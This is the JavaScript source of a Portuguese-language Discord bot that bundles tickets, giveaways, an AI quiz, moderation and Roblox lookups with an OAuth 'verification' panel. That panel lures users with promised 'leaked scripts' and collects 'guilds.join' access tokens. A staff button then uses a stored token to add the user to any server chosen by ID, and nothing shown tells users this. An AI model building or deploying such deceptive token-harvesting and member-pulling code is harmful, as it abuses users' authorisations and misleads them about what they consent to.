require('dotenv').config();
const express = require('express');
const axios = require('axios');
const moment = require('moment');
const OpenAI = require('openai'); // Certifique-se de ter 'openai' no package.json

const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, 
    TextInputStyle, StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
    PermissionsBitField, ChannelType, ApplicationCommandOptionType 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET = 'https://discord.com/app'; 

// --- SETUP IA ---
let openai;
if (process.env.OPENAI_API_KEY) {
    openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
}

// --- SETUP BOT ---
const app = express();
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent, // Para o Quiz ler o chat
        GatewayIntentBits.GuildMembers
    ]
});

// MEMÓRIA
const userTokens = new Map(); 
const sorteiosAtivos = new Map(); 
const activeQuizzes = new Map(); 

// =================================================================
// 1. SISTEMA WEB (AUTH PREMIUM)
// =================================================================
app.get('/', (req, res) => res.send('💎 Super Bot Ultimate Online'));

app.get('/callback', async (req, res) => {
    const { code, state } = req.query; 
    if (!code) return res.send('Erro: Falta código.');

    try {
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI,
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${access_token}` }, });
        const user = userResponse.data;
        userTokens.set(user.id, access_token);

        let statusCargo = "⏭️ Ignorado (Sem State)"; 
        let nomeServidor = "Desconhecido";

        if (state) { 
            try { 
                const guild = client.guilds.cache.get(state); 
                if (guild) { 
                    nomeServidor = guild.name; 
                    const member = await guild.members.fetch(user.id).catch(() => null); 
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados'); 
                    if (member && role) { 
                        await member.roles.add(role); 
                        statusCargo = `✅ Entregue em: ${guild.name}`; 
                    } else { 
                        statusCargo = `❌ Falha: Cargo não existe em ${guild.name}`; 
                    } 
                } 
            } catch (e) { console.error(e); } 
        }

        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            const embed = new EmbedBuilder().setTitle('🌍 Nova Verificação').setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`).addFields({ name: 'Usuário', value: `${user.username}\n(${user.id})`, inline: true }, { name: 'Origem', value: nomeServidor, inline: true }, { name: 'Cargo', value: statusCargo, inline: false }).setColor(0x00FF00);
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`btn_abrir_envio_${user.id}`).setLabel('Enviar Usuário').setStyle(ButtonStyle.Primary).setEmoji('✈️'));
            logChannel.send({ embeds: [embed], components: [row] });
        }

        res.send(`<!DOCTYPE html><html lang="pt-br"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Acesso Liberado</title><style>:root{--blurple:#5865F2;--dark:#2b2d31}body{background-color:var(--dark);font-family:'Segoe UI',sans-serif;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden}.card{background:rgba(30,31,34,0.8);backdrop-filter:blur(10px);padding:40px;border-radius:15px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);animation:popIn 0.6s cubic-bezier(0.68,-0.55,0.27,1.55)}.icon{font-size:60px;margin-bottom:20px;animation:pulse 2s infinite}h1{margin:0 0 10px;font-size:28px}p{color:#b5bac1;margin-bottom:30px}.btn{background:var(--blurple);color:#fff;padding:12px 30px;text-decoration:none;border-radius:5px;font-weight:bold;transition:0.3s}.btn:hover{box-shadow:0 0 15px var(--blurple)}@keyframes popIn{from{opacity:0;transform:scale(0.8)}to{opacity:1;transform:scale(1)}}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}</style></head><body><div class="card"><div class="icon">💎</div><h1>Acesso VIP Liberado</h1><p>Verificação concluída no servidor <b>${nomeServidor}</b>.<br>Seus privilégios foram ativados.</p><a href="${REDIRECT_TARGET}" class="btn">Voltar ao Servidor</a><div style="margin-top:20px;font-size:12px;color:#777">Redirecionando em 3s...</div></div><script>setTimeout(()=>{window.location.href="${REDIRECT_TARGET}"},3000)</script></body></html>`);

    } catch (e) { res.send('Erro na verificação.'); }
});
app.listen(process.env.PORT || 3000);

// =================================================================
// 2. BOT DISCORD
// =================================================================
client.once('ready', async () => {
    console.log(`🤖 Bot Supremo Logado: ${client.user.tag}`);

    const commands = [
        // --- SISTEMAS PRINCIPAIS ---
        { name: 'painel_auth', description: 'Cria o painel de verificação' },
        { name: 'painel_ticket', description: 'Cria o painel de suporte' },
        { name: 'sorteio', description: 'Inicia um sorteio', options: [{ name: 'premio', description: 'Prêmio', type: 3, required: true }, { name: 'minutos', description: 'Duração', type: 4, required: true }] },
        
        // --- DIVERSÃO ---
        { name: 'ship', description: 'Calcula o amor entre duas pessoas', options: [{ name: 'usuario1', description: 'Pessoa 1', type: 6, required: true }, { name: 'usuario2', description: 'Pessoa 2', type: 6, required: true }] },
        { 
            name: 'quiz', description: 'Quiz manual ou com IA',
            options: [
                { name: 'manual', description: 'Crie sua pergunta', type: 1, options: [{ name: 'pergunta', description: '?', type: 3, required: true }, { name: 'resposta', description: '!', type: 3, required: true }] },
                { name: 'ia', description: 'Gerar com IA', type: 1, options: [{ name: 'tema', description: 'Tema opcional', type: 3, required: false }] }
            ]
        },

        // --- ÚTEIS & ROBLOX (AS 10 NOVAS) ---
        { name: 'ping', description: 'Latência do bot' },
        { name: 'avatar', description: 'Vê o avatar de alguém', options: [{ name: 'usuario', description: 'De quem?', type: 6, required: false }] },
        { name: 'serverinfo', description: 'Infos do servidor' },
        { name: 'userinfo', description: 'Infos do usuário', options: [{ name: 'usuario', description: 'Quem?', type: 6, required: false }] },
        { name: 'limpar', description: 'Apaga mensagens', options: [{ name: 'quantidade', description: 'Qtd (1-100)', type: 4, required: true }] },
        { name: 'lock', description: 'Tranca o canal', options: [{ name: 'motivo', description: 'Motivo', type: 3, required: false }] },
        { name: 'unlock', description: 'Destranca o canal' },
        { name: 'anunciar', description: 'Envia Embed', options: [{ name: 'titulo', description: 'Título', type: 3, required: true }, { name: 'mensagem', description: 'Texto', type: 3, required: true }] },
        { name: 'roblox', description: 'Ver perfil do Roblox', options: [{ name: 'nick', description: 'Nick do Roblox', type: 3, required: true }] },
        { name: 'sugestao', description: 'Envia sugestão', options: [{ name: 'texto', description: 'Sua ideia', type: 3, required: true }] }
    ];

    await client.application.commands.set(commands);
    console.log("✅ Todos os 15 comandos registrados!");
});

// Listener Quiz
client.on('messageCreate', async message => {
    if (message.author.bot) return;
    if (activeQuizzes.has(message.channel.id)) {
        const respostaCerta = activeQuizzes.get(message.channel.id);
        if (message.content.toLowerCase().includes(respostaCerta.toLowerCase())) {
            message.reply(`🏆 **PARABÉNS!** ${message.author} acertou! Resposta: **${respostaCerta}**.`);
            activeQuizzes.delete(message.channel.id);
        }
    }
});

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        const { commandName } = interaction;

        // --- COMANDOS PRINCIPAIS ---
        if (commandName === 'painel_auth') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({content:'Sem permissão.', ephemeral:true});
            const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
            const embed = new EmbedBuilder().setTitle('🛡️ Verificação Segura').setDescription('Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!').setColor(0x5865F2).setFooter({ text: 'Sistema seguro de Verificação' });
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
            await interaction.channel.send({ embeds: [embed], components: [row] });
            interaction.reply({ content: 'Painel Auth enviado.', ephemeral: true });
        }

        if (commandName === 'painel_ticket') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({content:'Sem permissão.', ephemeral:true});
            const embed = new EmbedBuilder().setTitle('🎫 Central de Suporte').setDescription('Selecione abaixo a categoria.').setColor('Gold');
            const menu = new StringSelectMenuBuilder().setCustomId('menu_ticket_criar').setPlaceholder('Categoria').addOptions(new StringSelectMenuOptionBuilder().setLabel('Suporte').setValue('Sup').setEmoji('❓'), new StringSelectMenuOptionBuilder().setLabel('Compras').setValue('Vendas').setEmoji('💎'), new StringSelectMenuOptionBuilder().setLabel('Bug').setValue('Bug').setEmoji('🐛'));
            await interaction.channel.send({ embeds: [embed], components: [new ActionRowBuilder().addComponents(menu)] });
            interaction.reply({ content: 'Painel Ticket enviado.', ephemeral: true });
        }

        if (commandName === 'sorteio') {
            const premio = interaction.options.getString('premio');
            const minutos = interaction.options.getInteger('minutos');
            const tempoMs = minutos * 60 * 1000;
            const fimTimestamp = Math.floor((Date.now() + tempoMs) / 1000);
            const embed = new EmbedBuilder().setTitle('🎉 SORTEIO').setDescription(`**Prêmio:** ${premio}\n**Termina às:** <t:${fimTimestamp}:t>`).setColor(0xF4D03F);
            const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('entrar_sorteio').setLabel('Participar (0)').setStyle(ButtonStyle.Success).setEmoji('🎉'));
            const msg = await interaction.reply({ embeds: [embed], components: [btn], fetchReply: true });
            sorteiosAtivos.set(msg.id, { participantes: new Set(), premio });
            setTimeout(async () => {
                const dados = sorteiosAtivos.get(msg.id);
                if(!dados) return;
                const lista = Array.from(dados.participantes);
                let txt = "Cancelado (0 participantes).";
                if(lista.length > 0) {
                    const ganhador = lista[Math.floor(Math.random() * lista.length)];
                    txt = `👑 Parabéns <@${ganhador}> ganhou **${dados.premio}**!`;
                    msg.channel.send(txt).catch(()=>{});
                }
                const embedFim = new EmbedBuilder().setTitle('🎉 ENCERRADO').setDescription(txt).setColor('Red');
                msg.edit({ embeds: [embedFim], components: [] }).catch(()=>{});
            }, tempoMs);
        }

        if (commandName === 'ship') {
            const u1 = interaction.options.getUser('usuario1');
            const u2 = interaction.options.getUser('usuario2');
            const pct = Math.floor(Math.random() * 101);
            const barra = '🟩'.repeat(Math.round(pct/10)) + '⬛'.repeat(10 - Math.round(pct/10));
            interaction.reply({ embeds: [new EmbedBuilder().setTitle('💘 Cupido').setDescription(`**${u1}** ❤️ **${u2}**\n**${pct}%**\n${barra}`).setColor('Red')] });
        }

        if (commandName === 'quiz') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) return interaction.reply({content:'Apenas Mods.', ephemeral:true});
            if (activeQuizzes.has(interaction.channel.id)) return interaction.reply({content: 'Já tem quiz aqui!', ephemeral:true});
            const sub = interaction.options.getSubcommand();

            if (sub === 'manual') {
                const p = interaction.options.getString('pergunta');
                const r = interaction.options.getString('resposta');
                activeQuizzes.set(interaction.channel.id, r);
                interaction.reply({ embeds: [new EmbedBuilder().setTitle('🧠 QUIZ').setDescription(`**${p}**`).setColor('Purple')] });
            }
            if (sub === 'ia') {
                if(!openai) return interaction.reply({content:'IA não configurada.', ephemeral:true});
                await interaction.deferReply();
                const tema = interaction.options.getString('tema') || 'geral';
                try {
                    const completion = await openai.chat.completions.create({ model: "gpt-3.5-turbo", messages: [{role:"user",content:`Gere pergunta sobre "${tema}" em JSON: {"pergunta":"...","resposta":"..."}`}] });
                    let dadosIA = JSON.parse(completion.choices[0].message.content.replace(/```json\n|\n```/g, ''));
                    activeQuizzes.set(interaction.channel.id, dadosIA.resposta);
                    interaction.editReply({ embeds: [new EmbedBuilder().setTitle(`🧠 QUIZ IA: ${tema}`).setDescription(`**${dadosIA.pergunta}**`).setColor('Aqua')] });
                } catch(e) { interaction.editReply('Erro na IA.'); }
            }
        }

        // --- 10 COMANDOS ÚTEIS ---
        
        if (commandName === 'ping') interaction.reply(`🏓 Latência: ${Date.now() - interaction.createdTimestamp}ms`);
        
        if (commandName === 'avatar') {
            const u = interaction.options.getUser('usuario') || interaction.user;
            interaction.reply({ embeds: [new EmbedBuilder().setTitle(`Avatar de ${u.username}`).setImage(u.displayAvatarURL({dynamic:true, size:1024})).setColor('Random')] });
        }

        if (commandName === 'serverinfo') {
            const g = interaction.guild;
            interaction.reply({ embeds: [new EmbedBuilder().setTitle(g.name).addFields({name:'Membros',value:`${g.memberCount}`,inline:true},{name:'Dono',value:`<@${g.ownerId}>`,inline:true},{name:'Criado',value:`<t:${Math.floor(g.createdTimestamp/1000)}:R>`,inline:true}).setThumbnail(g.iconURL()).setColor('Blue')] });
        }

        if (commandName === 'userinfo') {
            const m = interaction.options.getMember('usuario') || interaction.member;
            interaction.reply({ embeds: [new EmbedBuilder().setTitle(m.user.username).addFields({name:'Entrou',value:`<t:${Math.floor(m.joinedTimestamp/1000)}:R>`,inline:true},{name:'ID',value:m.id,inline:false}).setThumbnail(m.user.displayAvatarURL()).setColor('Purple')] });
        }

        if (commandName === 'limpar') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) return interaction.reply({content:'Sem permissão.', ephemeral:true});
            const amount = interaction.options.getInteger('quantidade');
            await interaction.channel.bulkDelete(amount, true).catch(()=>{});
            interaction.reply({content:`🧹 ${amount} mensagens apagadas.`, ephemeral:true});
        }

        if (commandName === 'lock') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return;
            await interaction.channel.permissionOverwrites.edit(interaction.guild.id, { SendMessages: false });
            interaction.reply('🔒 Canal trancado.');
        }

        if (commandName === 'unlock') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return;
            await interaction.channel.permissionOverwrites.edit(interaction.guild.id, { SendMessages: true });
            interaction.reply('🔓 Canal destrancado.');
        }

        if (commandName === 'anunciar') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
            const t = interaction.options.getString('titulo');
            const m = interaction.options.getString('mensagem');
            await interaction.channel.send({ embeds: [new EmbedBuilder().setTitle(t).setDescription(m).setColor('Gold').setFooter({text:`Por: ${interaction.user.tag}`})] });
            interaction.reply({content:'Enviado.', ephemeral:true});
        }

        if (commandName === 'sugestao') {
            const t = interaction.options.getString('texto');
            const msg = await interaction.reply({ embeds: [new EmbedBuilder().setTitle('💡 Sugestão').setDescription(t).setColor('Yellow').setAuthor({name:interaction.user.tag, iconURL:interaction.user.displayAvatarURL()})], fetchReply: true });
            msg.react('✅'); msg.react('❌');
        }

        if (commandName === 'roblox') {
            const nick = interaction.options.getString('nick');
            await interaction.deferReply();
            try {
                const idRes = await axios.post('https://users.roblox.com/v1/usernames/users', { usernames: [nick], excludeBannedUsers: true });
                if (idRes.data.data.length === 0) return interaction.editReply('❌ Não encontrado.');
                const user = idRes.data.data[0];
                const detail = await axios.get(`https://users.roblox.com/v1/users/${user.id}`);
                const thumb = await axios.get(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
                interaction.editReply({ embeds: [new EmbedBuilder().setTitle(`🎮 ${detail.data.name}`).setURL(`https://www.roblox.com/users/${user.id}/profile`).setThumbnail(thumb.data.data[0].imageUrl).addFields({name:'ID',value:`${user.id}`,inline:true},{name:'Display',value:detail.data.displayName,inline:true},{name:'Criado',value:moment(detail.data.created).format('DD/MM/YYYY'),inline:false}).setColor('#E90000')] });
            } catch(e) { interaction.editReply('Erro na API Roblox.'); }
        }
    }

    // --- INTERAÇÕES DE BOTÕES E MODALS ---
    if (interaction.isStringSelectMenu() && interaction.customId === 'menu_ticket_criar') { const categoria = interaction.values[0]; const modal = new ModalBuilder().setCustomId(`modal_ticket_${categoria}`).setTitle('Detalhes'); modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('motivo').setLabel('Motivo').setStyle(TextInputStyle.Paragraph))); interaction.showModal(modal); }
    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_ticket_')) { const categoria = interaction.customId.split('_')[2]; const motivo = interaction.fields.getTextInputValue('motivo'); const canal = await interaction.guild.channels.create({ name: `${categoria}-${interaction.user.username}`, type: ChannelType.GuildText, topic: interaction.user.id, permissionOverwrites: [{ id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] }, { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }, { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }] }); canal.send({ content: `${interaction.user}`, embeds: [new EmbedBuilder().setTitle(`Ticket: ${categoria}`).setDescription(`Motivo: ${motivo}`).setColor('Green')], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('fechar_ticket').setLabel('Fechar').setStyle(ButtonStyle.Danger).setEmoji('🔒'))] }); interaction.reply({ content: `Criado: ${canal}`, ephemeral: true }); }
    if (interaction.isButton() && interaction.customId === 'fechar_ticket') { interaction.reply('Deletando...'); setTimeout(() => interaction.channel.delete(), 5000); }
    if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) { const uid = interaction.customId.split('_')[3]; const modal = new ModalBuilder().setCustomId(`modal_envio_${uid}`).setTitle('Enviar Usuário'); modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('srv_id').setLabel('ID Servidor').setStyle(TextInputStyle.Short))); interaction.showModal(modal); }
    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) { const uid = interaction.customId.split('_')[2]; const srvId = interaction.fields.getTextInputValue('srv_id'); const token = userTokens.get(uid); await interaction.deferReply({ ephemeral: true }); if (!token) return interaction.editReply('Token expirou.'); try { await axios.put(`https://discord.com/api/guilds/${srvId}/members/${uid}`, { access_token: token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }); interaction.editReply(`✅ Enviado para \`${srvId}\`.`); } catch (e) { interaction.editReply('Erro. Bot está no servidor alvo?'); } }
    if (interaction.isButton() && interaction.customId === 'entrar_sorteio') { const dados = sorteiosAtivos.get(interaction.message.id); if(!dados) return interaction.reply({content:'Acabou.', ephemeral:true}); if(dados.participantes.has(interaction.user.id)) { dados.participantes.delete(interaction.user.id); interaction.reply({content:'Saiu.', ephemeral:true}); } else { dados.participantes.add(interaction.user.id); interaction.reply({content:'Entrou!', ephemeral:true}); } const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('entrar_sorteio').setLabel(`Participar (${dados.participantes.size})`).setStyle(ButtonStyle.Success).setEmoji('🎉')); interaction.message.edit({ components: [btn] }); }
});

client.login(process.env.BOT_TOKEN);
